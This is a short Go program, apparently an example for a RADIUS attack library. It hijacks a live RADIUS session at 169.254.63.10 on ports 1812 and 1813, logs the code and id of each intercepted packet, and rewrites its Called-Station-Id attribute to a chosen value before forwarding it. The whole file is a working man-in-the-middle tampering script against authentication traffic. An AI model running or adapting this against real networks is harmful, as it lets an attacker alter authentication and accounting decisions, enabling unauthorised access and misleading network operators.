package main

import (
	"fmt"
	"net"
	"radius/radiuspacket"
	"radius/session"
)

const authPort = 1812
const accPort = 1813

func manglePacket(manglePacket *radiuspacket.RadiusPacket, from net.UDPAddr, to net.UDPAddr) bool {

	fmt.Println("Pck rcv from ", from, "to", to)

	fmt.Println("Code:", manglePacket.GetCode())
	fmt.Println("Id:", manglePacket.GetId())

	present, sta := manglePacket.GetStrAttr(radiuspacket.CalledStationId)

	if present {
		fmt.Println("Called STA:", sta)
		manglePacket.SetStrAttr(radiuspacket.CalledStationId, "00-19-86-81-1B-84:JAJA")
	}

	return true

}

func main() {

	//Init session
	var mySession session.Session

	mySession.Init(session.Active, "169.254.63.10", authPort, accPort)

	mySession.Hijack(manglePacket)
}
